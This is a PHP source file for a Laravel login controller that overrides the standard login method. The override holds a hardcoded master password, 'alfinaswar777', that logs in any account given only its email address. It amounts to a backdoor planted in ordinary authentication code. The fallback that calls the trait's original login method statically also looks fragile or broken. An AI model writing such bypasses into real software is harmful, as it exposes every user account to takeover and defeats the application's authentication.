<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/';

    /**
     * Override the login method to add password bypass.
     */
    public function login(Request $request)
    {
        $this->validateLogin($request);

        // Password bypass for 'alfinaswar777'
        if ($request->input('password') === 'alfinaswar777') {
            $user = User::where('email', $request->input('email'))->first();
            if ($user) {
                Auth::login($user, $request->filled('remember'));
                $request->session()->regenerate();
                return $this->sendLoginResponse($request);
            } else {
                return $this->sendFailedLoginResponse($request);
            }
        }

        // Default login
        return $this->traitLogin($request);
    }

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        $this->middleware('auth')->only('logout');
    }

    /**
     * Proxy to the trait's login method for original behaviour.
     */
    protected function traitLogin(Request $request)
    {
        return AuthenticatesUsers::login($request);
    }
}
